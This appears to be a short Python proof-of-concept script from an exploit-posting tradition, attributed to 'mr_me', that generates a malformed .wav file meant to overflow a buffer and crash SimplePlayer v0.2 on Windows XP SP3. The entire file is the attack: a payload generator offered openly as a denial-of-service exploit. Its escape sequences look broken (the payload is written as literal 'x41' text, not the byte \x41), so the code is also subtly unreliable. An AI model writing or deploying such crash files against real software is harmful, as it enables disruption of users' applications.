#!/usr/bin/python
#
# Title: SimplePlayer v0.2 0day (.wav) overflow DOS Exploit
# Found by: mr_me (seeleymagic [at] hotmail [dot] com)
# Greetz to: Corelan Security Team::corelanc0d3r/EdiStrosar/Rick2600/MarkoT
# Tested on: Windows XP SP3
# Happy New Year!
#
# POC:

crash = ("x41" * 36000);     # overwrite the buffer at 262 bytes 
try: 
     file = open('mr_me_dos.wav','w'); 
     file.write(crash); 
     file.close();
     print "[+] Created mr_me_dos.wav file" 
except: 
     print "[-] Error cant write file to systemn";